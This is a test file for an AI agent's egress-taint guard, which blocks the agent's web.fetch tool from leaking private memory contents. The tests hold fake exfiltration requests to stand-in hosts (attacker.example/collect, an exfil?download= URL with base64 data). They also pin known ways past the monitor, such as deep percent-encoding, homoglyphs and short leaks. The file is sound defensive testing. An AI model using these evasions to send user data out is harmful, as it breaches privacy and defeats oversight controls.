import { describe, expect, it } from 'vitest';
import type {
  ChatChunk,
  ChatMessage,
  ChatProcessor,
  ModelCapability,
  SkillPack,
  ToolInvocationFrame,
  ToolResultFrame,
} from '@calypso/chat-types';

import { EgressTaintLedger } from '../tools/egress-taint';
import { ToolGateway, type ClientBridge } from '../tools';
import { effectiveNativeWebSearchMode } from '../providers/native-web-search';
import { runOrchestrator, type RunOrchestratorDeps } from '../orchestrator/executor';

// B11 — Egress-taint adversarial corpus.
//
// Extends the existing egress-taint suites (egress-taint.test.ts,
// tool-gateway-egress-taint.test.ts, orchestrator-egress-memory-isolation.test.ts)
// with reproduction variants those files do NOT cover:
//   1. substring-in-query threshold pinning (NGRAM / MIN_TOKEN floors),
//   2. URL-encoding DEPTH (single + the MAX_PERCENT_PASSES boundary),
//   3. base64 re-encoding of a distinctive TOKEN (token-after-decode path),
//   4. taint carry across an orchestrator subtask working-memory DIGEST,
//   5. NEGATIVE control: native provider web search is NOT taint-gated.
//
// Declared matcher contract (from egress-taint.ts header):
//   - normalise = NFKC-fold + lowercase + keep \p{L}\p{N} from ANY script.
//   - GRAM match: egress shares a contiguous normalised window of >= NGRAM (20)
//     chars with harvested content.
//   - TOKEN match: egress contains a harvested whitespace-delimited chunk / email
//     that normalises to >= MIN_TOKEN (12) chars.
//   - Below those floors (a single common word, a <12-char id) is INTENTIONALLY
//     not flagged — the documented "look up the topic of my note" trade-off.
//   - Before matching, egress is canonicalised across REVERSIBLE encodings:
//     up to MAX_PERCENT_PASSES (3) percent-decode levels, base64/base64url/hex.
//     Compression, ciphers, homoglyph transliteration, deeper nesting than the
//     bounded layers, and a secret split across multiple fetches are explicitly
//     OUT OF SCOPE (documented heuristic limits, not bugs).

const NEUTRAL_URL = 'https://collector.example/';

// ---------------------------------------------------------------------------
// Corpus 1 — substring of tainted content in a URL query: threshold pinning.
// ---------------------------------------------------------------------------
//
// Pins the exact floors the matcher uses so a future change to NGRAM/MIN_TOKEN
// is visible. Fixtures are pure-ASCII alnum/space so `normalise` is just
// lowercase+strip — letter counts equal normalised-char counts, no hidden math.
describe('EgressTaintLedger — substring-in-query threshold (B11 corpus 1)', () => {
  // Token-LESS phrase (every word < MIN_TOKEN) so ONLY the gram path can fire.
  // normalised: "alphabravocharliedeltaechofoxtrot" (33 chars).
  const GRAM_SECRET = 'alpha bravo charlie delta echo foxtrot';

  it('blocks a >=20-char distinctive substring smuggled in a ?q= query param', () => {
    const t = new EgressTaintLedger();
    t.addText(GRAM_SECRET);
    // 21 normalised chars of the secret, wrapped in a real query string.
    const url = `${NEUTRAL_URL}search?q=bravocharliedeltaecho`;
    expect(t.isEgressTainted(url, '')).toBe(true);
  });

  it('pins the NGRAM floor: exactly 20 contiguous chars blocks, 19 does NOT', () => {
    const t = new EgressTaintLedger();
    t.addText(GRAM_SECRET);
    // First 20 normalised chars -> a full harvested gram -> blocked.
    expect(t.isEgressTainted(NEUTRAL_URL, 'alphabravocharliedel')).toBe(true);
    // First 19 normalised chars -> no complete 20-window of the secret can
    // appear (the URL prefix only glues non-secret chars) -> permitted. This is
    // the documented short-leak trade-off, pinned to NGRAM=20.
    const t2 = new EgressTaintLedger();
    t2.addText(GRAM_SECRET);
    expect(t2.isEgressTainted(NEUTRAL_URL, 'alphabravocharliede')).toBe(false);
  });

  it('matches a gram in the MIDDLE of the egress (sliding window, not anchored)', () => {
    const t = new EgressTaintLedger();
    t.addText(GRAM_SECRET);
    // The harvested gram sits between attacker padding on both sides.
    const q = `noise12345 charliedeltaechofoxtrot trailingpad`;
    expect(t.isEgressTainted(NEUTRAL_URL, q)).toBe(true);
  });

  it('catches a gram SPLIT across the url and query of ONE fetch (combined before match)', () => {
    const t = new EgressTaintLedger();
    t.addText(GRAM_SECRET);
    // url ends with the first half, query starts with the second half; the
    // guard matches on `${url} ${query}` so the space normalises away and the
    // window is contiguous. (Splitting across SEPARATE fetches is out of scope.)
    expect(
      t.isEgressTainted(`${NEUTRAL_URL}x/alphabravochar`, 'liedeltaecho leak'),
    ).toBe(true);
  });

  it('pins the MIN_TOKEN floor: a 12-char identifier blocks, an 11-char one does NOT', () => {
    // 12-char distinctive token -> harvested as a token -> blocked even though
    // it is shorter than a 20-char gram.
    const t12 = new EgressTaintLedger();
    t12.addText('the badge code is wolverine123 only');
    expect(t12.isEgressTainted(NEUTRAL_URL, 'q=wolverine123')).toBe(true);

    // 11-char identifier -> below MIN_TOKEN, not harvested, and too short to
    // form a 20-gram -> permitted (documented trade-off, pinned to MIN_TOKEN=12).
    const t11 = new EgressTaintLedger();
    t11.addText('the badge code is wolverine12 only');
    expect(t11.isEgressTainted(NEUTRAL_URL, 'q=wolverine12')).toBe(false);
  });

  it('does NOT flag a single short common word from the note (false-positive trade-off)', () => {
    const t = new EgressTaintLedger();
    t.addText('the secret merger note about project apollo');
    // "merger" (6 chars) is the topic of the note; looking it up is legitimate.
    expect(t.isEgressTainted(NEUTRAL_URL, 'q=merger')).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// Corpus 2 — URL-encoded / percent re-encoding depth.
// (egress-taint.test.ts already covers DOUBLE percent + percent-then-base64;
//  these pin SINGLE encoding and the MAX_PERCENT_PASSES decode-depth boundary.)
// ---------------------------------------------------------------------------
describe('EgressTaintLedger — URL-encoding depth (B11 corpus 2)', () => {
  // Token-less phrase so only the GRAM path fires: percent-encoding only touches
  // the spaces, so a surviving word-token could mask the depth boundary.
  const PHRASE = 'the red fox jumps over nine lazy dogs';

  it('blocks a SINGLE percent-encoded phrase in a query param', () => {
    const t = new EgressTaintLedger();
    t.addText(PHRASE);
    const q = `q=${encodeURIComponent(PHRASE)}`;
    expect(t.isEgressTainted(NEUTRAL_URL, q)).toBe(true);
  });

  it('blocks TRIPLE percent-encoding (within MAX_PERCENT_PASSES=3)', () => {
    const t = new EgressTaintLedger();
    t.addText(PHRASE);
    const triple = encodeURIComponent(
      encodeURIComponent(encodeURIComponent(PHRASE)),
    );
    expect(t.isEgressTainted(NEUTRAL_URL, triple)).toBe(true);
  });

  it('QUADRUPLE percent-encoding is NOT reversed — documented MAX_PERCENT_PASSES limit, NOT a regression', () => {
    // The guard unwinds at most MAX_PERCENT_PASSES (3) levels; a 4x-encoded
    // token-less phrase never reaches plaintext within that budget, so the
    // spaces remain as "20" digits and no contiguous gram forms. This is the
    // egress-taint.ts "deeper nesting than the bounded layers ... NOT reversed"
    // limitation, mitigated in practice by single-mode strictEgressLock and
    // orchestrator memory isolation. Pinned so the depth boundary is explicit.
    const t = new EgressTaintLedger();
    t.addText(PHRASE);
    const quad = encodeURIComponent(
      encodeURIComponent(encodeURIComponent(encodeURIComponent(PHRASE))),
    );
    expect(t.isEgressTainted(NEUTRAL_URL, quad)).toBe(false);
  });

  it('blocks percent-encoded NON-ASCII (multi-byte Cyrillic) reproduction', () => {
    const t = new EgressTaintLedger();
    const secret = 'секретный пароль для банковского проекта';
    t.addText(secret);
    // %D0%9F-style multi-byte UTF-8 escapes must survive piecewise decode.
    const q = encodeURIComponent(secret);
    expect(t.isEgressTainted(NEUTRAL_URL, q)).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// Corpus 3 — base64 re-encoding of a distinctive TOKEN.
// (egress-taint.test.ts base64 fixtures match via the GRAM path; these exercise
//  the TOKEN path AFTER a base64 decode, and a structural query-param wrapper.)
// ---------------------------------------------------------------------------
describe('EgressTaintLedger — base64 token re-encoding (B11 corpus 3)', () => {
  it('blocks a base64-encoded distinctive identifier token (token-after-decode)', () => {
    const t = new EgressTaintLedger();
    // "wolverine123456" (15 chars) is harvested as a >=12 token, not a gram.
    t.addText('the agent identifier is wolverine123456 retire it');
    const b64 = Buffer.from('wolverine123456', 'utf8').toString('base64');
    expect(b64).not.toContain('wolverine'); // guard: fixture really re-encodes
    expect(t.isEgressTainted(NEUTRAL_URL, b64)).toBe(true);
  });

  it('blocks a base64 token wrapped in a ?download= query param (structural prefix)', () => {
    const t = new EgressTaintLedger();
    t.addText('the agent identifier is wolverine123456 retire it');
    const b64 = Buffer.from('wolverine123456', 'utf8').toString('base64');
    const url = `${NEUTRAL_URL}exfil?download=${b64}`;
    expect(t.isEgressTainted(url, '')).toBe(true);
  });

  it('does NOT flag a base64-encoded UNRELATED token (no false positive)', () => {
    const t = new EgressTaintLedger();
    t.addText('the agent identifier is wolverine123456 retire it');
    const benign = Buffer.from('todaysweatherforecast', 'utf8').toString('base64');
    expect(t.isEgressTainted(NEUTRAL_URL, benign)).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// Documented heuristic limitation: cross-script homoglyph transliteration.
// NOT a P-finding — the CONTENT matcher is explicitly "defence-in-depth, not a
// complete information-flow tracker"; the real guarantees are single-mode
// strictEgressLock (blocks ALL egress after any private read) and orchestrator
// memory isolation (the egress worker never sees private content). Pinned here
// so the limitation is visible and any future fold of confusables is caught.
// ---------------------------------------------------------------------------
describe('EgressTaintLedger — documented heuristic limits (not bugs)', () => {
  it('does NOT fold Latin->Cyrillic homoglyphs (content matcher alone; lock/isolation are the guard)', () => {
    const t = new EgressTaintLedger();
    t.addText('the secret codeword is silverlining horizon');
    // Replace Latin a/e/o with Cyrillic look-alikes (NFKC does not fold these).
    const homoglyph = 'silvеrlining hкrizкn'; // е о о (Cyrillic)
    expect(homoglyph).not.toBe('silverlining horizon');
    expect(t.isEgressTainted(NEUTRAL_URL, homoglyph)).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// Corpus 5 — NEGATIVE control: native provider web search is NOT taint-gated.
// ---------------------------------------------------------------------------
//
// The egress-taint ledger gates ONLY the agent `web.fetch` gateway tool. Native
// provider web search is a USER-APPROVED, provider-side request flag
// (chatPayload.nativeWebSearch -> adapter tools:[{type:'web_search'}]) decided
// solely by effectiveNativeWebSearchMode(requested, capability, allowedByServer)
// — it has no taint input. This proves the two egress channels are governed
// independently: agent web.fetch is taint-blocked, user-approved native search
// is not.
const TAINT_SECRET = 'the project codename is silverlining wombat';

function nativeControlPack(): SkillPack {
  return {
    id: 'personal-agent.default',
    version: 1,
    displayName: 'Default',
    description: 'Default pack.',
    systemPromptBlock: 'You are Calypso.',
    toolScopes: ['memory.read', 'web.fetch'],
    capabilitySuiteIds: ['text'],
    defaultNamespace: 'default',
    linkedFolderScopes: {},
    uiHints: { icon: 'default', accentToken: 'accent-default' },
  };
}

function memoryReadBridge(secret: string): ClientBridge {
  return {
    async invokeClient(frame: ToolInvocationFrame): Promise<ToolResultFrame> {
      if (frame.toolName === 'memory.read') {
        return {
          invocationId: frame.invocationId,
          outcome: 'ok',
          resultJson: {
            record: {
              id: 'mem-1',
              namespace: 'default',
              baseVersion: 0,
              tombstoneEpoch: 0,
              dreamSessionId: 'dream-1',
              kind: 'fact',
              text: secret,
              structured: {},
              tags: [],
              provenance: [
                {
                  excerpt: 'source excerpt',
                  excerptHash: 'sha256-abc12345',
                  sourceRef: { type: 'conversation', conversationId: 'conv-1' },
                  extractedAt: '2026-05-25T00:00:00.000Z',
                  dreamSessionId: 'dream-1',
                },
              ],
              confidence: 0.9,
              createdAt: '2026-05-25T00:00:00.000Z',
              updatedAt: '2026-05-25T00:00:00.000Z',
              supersededBy: null,
              visibleToUser: true,
            },
          },
        };
      }
      return { invocationId: frame.invocationId, outcome: 'ok', resultJson: { status: 200 } };
    },
  };
}

function webFetchFrame(query: string): ToolInvocationFrame {
  return {
    invocationId: `inv_${Math.random().toString(36).slice(2)}`,
    agentTurnId: 'turn_native',
    toolName: 'web.fetch',
    args: { url: 'https://attacker.example/collect', query },
  };
}

describe('native provider web search is NOT taint-gated (B11 corpus 5, negative control)', () => {
  it('keeps native web search enabled even when the gateway has tainted egress', async () => {
    const pack = nativeControlPack();
    const gw = new ToolGateway({
      clientBridge: memoryReadBridge(TAINT_SECRET),
      strictEgressLock: true,
    });

    // A private read taints the ledger AND trips the single-mode lock.
    const read = await gw.dispatch(
      { invocationId: 'inv_read', agentTurnId: 'turn_native', toolName: 'memory.read', args: { id: 'mem-1' } },
      pack,
      'turn_native',
    );
    expect(read.outcome).toBe('ok');

    // The agent egress tool (web.fetch) is now blocked by taint...
    const blocked = gw.prepareInvocation(
      webFetchFrame('best pizza recipes in rome'),
      pack,
      'turn_native',
    );
    expect(blocked.ok).toBe(false);
    if (!blocked.ok) expect(blocked.reason).toBe('TAINTED_EGRESS_BLOCKED');

    // ...but native provider web search has NO taint input: it stays 'auto'
    // when requested, model-capable, and server-allowed.
    expect(
      effectiveNativeWebSearchMode({
        requested: 'auto',
        capability: { providerTool: 'openai_web_search' },
        allowedByServer: true,
      }),
    ).toBe('auto');
  });

  it('native web search mode ignores taint entirely (still gated only by request/capability/server)', () => {
    // No relationship to any ledger — these are the ONLY three inputs.
    expect(
      effectiveNativeWebSearchMode({
        requested: 'auto',
        capability: { providerTool: 'anthropic_web_search' },
        allowedByServer: true,
      }),
    ).toBe('auto');
    // Server veto still wins (orthogonal to taint).
    expect(
      effectiveNativeWebSearchMode({
        requested: 'auto',
        capability: { providerTool: 'anthropic_web_search' },
        allowedByServer: false,
      }),
    ).toBe('off');
  });
});

// ---------------------------------------------------------------------------
// Corpus 4 — taint across an orchestrator subtask working-memory DIGEST.
// ---------------------------------------------------------------------------
//
// orchestrator-egress-memory-isolation.test.ts proves PROSE and a no-tool relay
// stay out of a web.fetch worker. This fills the remaining gap: a subtask that
// actually CALLS a private read tool produces a STRUCTURED tool-result digest
// (digestToolResultForMemory -> composeMemoryEntryContent) carrying the LITERAL
// private payload into working memory. We assert that digest still does NOT
// reach a downstream web.fetch worker, that a non-egress dependent DOES receive
// it (positive control), and that the shared gateway taint ledger retains the
// taint ACROSS the subtask boundary (the "does taint survive the digest hop?"
// question, answered at the ledger layer too).
const DIGEST_CANARY = 'NIGHTJAR-DIGEST-CANARY-5521-PRIVATE';
const DIGEST_SECRET = `The private dossier canary is ${DIGEST_CANARY} and must never leave the enclave.`;

const digestPack: SkillPack = {
  id: 'personal-agent.default',
  version: 1,
  displayName: 'Default',
  description: 'General',
  defaultNamespace: 'default',
  systemPromptBlock: 'You are Calypso.',
  toolScopes: ['memory.read', 'web.fetch'],
  capabilitySuiteIds: ['text'],
  linkedFolderScopes: {},
  uiHints: { icon: 'default', accentToken: 'accent-default' },
};

const digestModels: ModelCapability[] = [
  {
    modelId: 'gpt-5.5',
    providerId: 'openai',
    strengths: ['writing', 'long_context', 'general_reasoning', 'research'],
    strengthQuality: [{ strength: 'research', tier: 'frontier' }],
    modalities: ['text_in', 'text_out'],
    endpointFamily: 'chat',
    costTier: 'high',
    latencyTier: 'standard',
    routingStatus: 'enabled',
    requiredGatewayTools: [],
    maxContextTokens: 1050000,
  },
];

// st_read CALLS memory.read (engaging the tool-result digest path), st_fetch is
// a web.fetch worker, st_report is a non-egress dependent.
const DIGEST_PLAN = `{
  "planId": "plan_digest",
  "title": "Read dossier, fetch, report",
  "summary": "Read a private memory record, fetch a public page, then report.",
  "subtasks": [
    {
      "id": "st_read",
      "title": "Read private dossier",
      "objective": "Read the private memory record and note its canary value.",
      "kind": "file_inspection",
      "requiredCapabilities": ["general_reasoning"],
      "allowedTools": ["memory.read"],
      "dependsOn": [],
      "producesArtifact": false,
      "risk": "low"
    },
    {
      "id": "st_fetch",
      "title": "Fetch public page",
      "objective": "Fetch the public URL and report the HTTP status.",
      "kind": "research",
      "requiredCapabilities": ["research"],
      "allowedTools": ["web.fetch"],
      "dependsOn": ["st_read"],
      "producesArtifact": false,
      "risk": "low"
    },
    {
      "id": "st_report",
      "title": "Report",
      "objective": "Write a short report of the run.",
      "kind": "writing",
      "requiredCapabilities": ["writing"],
      "allowedTools": [],
      "dependsOn": ["st_read"],
      "producesArtifact": true,
      "risk": "low"
    }
  ]
}`;

function digestPlanner(planJson: string): ChatProcessor {
  return {
    async *streamChat(messages: ChatMessage[]): AsyncGenerator<ChatChunk> {
      const prompt = messages.at(-1)?.content ?? '';
      const tag = prompt.match(/<plan id="([^"]+)">/)?.[1] ?? 'planner_test';
      yield {
        id: 'chunk',
        choices: [
          { delta: { content: `<plan id="${tag}">\n${planJson}\n</plan>` }, finish_reason: null },
        ],
      };
    },
  };
}

function collect<T>(gen: AsyncGenerator<T>): Promise<T[]> {
  return (async () => {
    const out: T[] = [];
    for await (const e of gen) out.push(e);
    return out;
  })();
}

function lastUserContent(messages: ChatMessage[]): string {
  return [...messages].reverse().find((m) => m.role === 'user')?.content ?? '';
}

describe('orchestrator — taint across subtask working-memory DIGEST (B11 corpus 4)', () => {
  it('keeps a private-read tool-result digest out of a web.fetch worker; a non-egress dependent and the shared ledger still carry it', async () => {
    const fetchWorkerInbound: string[] = [];
    const reportWorkerInbound: string[] = [];

    const gw = new ToolGateway({ clientBridge: memoryReadBridge(DIGEST_SECRET) });

    const workerFactory = (): ChatProcessor => ({
      async *streamChat(messages: ChatMessage[]): AsyncGenerator<ChatChunk> {
        const text = lastUserContent(messages);

        // st_read: invoke memory.read (its tool-result becomes a structured
        // digest in working memory), then summarise once the result returns.
        if (/Subtask: Read private dossier/.test(text)) {
          const sawResult = messages.some(
            (m) => m.role === 'user' && /Tool result — memory\.read/.test(m.content),
          );
          if (!sawResult) {
            yield {
              id: 'c',
              choices: [
                {
                  delta: {
                    content: '<tool>{"toolName":"memory.read","args":{"id":"mem-1"}}</tool>',
                  },
                  finish_reason: null,
                },
              ],
            };
            return;
          }
          yield {
            id: 'c',
            choices: [{ delta: { content: 'Noted the dossier record.' }, finish_reason: null }],
          };
          return;
        }

        // st_fetch (web.fetch-only): capture inbound context, then emit the
        // required web.fetch call so the subtask completes.
        if (/Subtask: Fetch public page/.test(text)) {
          const sawToolResult = messages.some(
            (m) => m.role === 'user' && /Tool result — web\.fetch/.test(m.content),
          );
          if (!sawToolResult) {
            fetchWorkerInbound.push(messages.map((m) => m.content).join('\n'));
            yield {
              id: 'c',
              choices: [
                {
                  delta: {
                    content:
                      '<tool>{"toolName":"web.fetch","args":{"url":"https://example.com/","query":"status"}}</tool>',
                  },
                  finish_reason: null,
                },
              ],
            };
            return;
          }
          yield {
            id: 'c',
            choices: [{ delta: { content: 'The page returned 200.' }, finish_reason: null }],
          };
          return;
        }

        // st_report (no tools, depends on st_read): capture inbound context.
        if (/Subtask: Report/.test(text)) {
          reportWorkerInbound.push(messages.map((m) => m.content).join('\n'));
          yield {
            id: 'c',
            choices: [{ delta: { content: 'Report written.' }, finish_reason: null }],
          };
          return;
        }

        yield { id: 'c', choices: [{ delta: { content: 'ok' }, finish_reason: null }] };
      },
    });

    const deps: RunOrchestratorDeps = {
      agentTurnId: 'turn_digest',
      gateway: gw,
      pack: digestPack,
      plannerProvider: digestPlanner(DIGEST_PLAN),
      workerProviderFactory: workerFactory,
      plannerModel: 'gpt-5.5',
      summaryModel: 'gpt-5.5',
      models: digestModels,
      enabledGatewayTools: digestPack.toolScopes,
      enabledEndpointFamilies: ['chat'],
      messages: [
        {
          role: 'user' as const,
          content:
            'Read my private dossier from memory, then fetch https://example.com and write a short report.',
        },
      ],
      // memory.read needs no linked folder (unlike the folder.read fixtures in
      // orchestrator-egress-memory-isolation.test.ts).
      requestContext: { linkedFolders: [], writePermissionMode: 'always_ask' as const },
      workerTimeoutMs: 5_000,
      summaryTimeoutMs: 5_000,
    };

    const events = await collect(runOrchestrator(deps));

    // The plan drove a read -> fetch -> report split (private dep stripped off
    // the fetch subtask).
    const planEvent = events.find(
      (e) => e && typeof e === 'object' && (e as { kind?: string }).kind === 'orchestrator-plan',
    ) as { plan: { subtasks: { id: string; allowedTools: string[]; dependsOn: string[] }[] } } | undefined;
    const fetchSubtask = planEvent?.plan.subtasks.find((s) => s.id === 'st_fetch');
    expect(fetchSubtask?.allowedTools).toEqual(['web.fetch']);
    expect(fetchSubtask?.dependsOn).toEqual([]); // private dep stripped

    expect(fetchWorkerInbound.length).toBeGreaterThan(0);
    expect(reportWorkerInbound.length).toBeGreaterThan(0);

    // CORE: the structured digest carrying the private record NEVER reaches the
    // web.fetch worker's model context.
    for (const inbound of fetchWorkerInbound) {
      expect(inbound).not.toContain(DIGEST_CANARY);
    }

    // POSITIVE CONTROL: the non-egress dependent DID receive the digest, proving
    // the canary genuinely propagated through the digest hop and is being
    // excluded specifically from the egress worker (not globally absent).
    expect(reportWorkerInbound.join('\n')).toContain(DIGEST_CANARY);

    // The shared gateway taint ledger retained the harvested private content
    // ACROSS the subtask boundary — so even a (hypothetical) egress that did
    // reproduce it would be blocked at the gateway.
    expect(gw.__egressTaintForTest().isEgressTainted(DIGEST_CANARY, '')).toBe(true);
  });
});
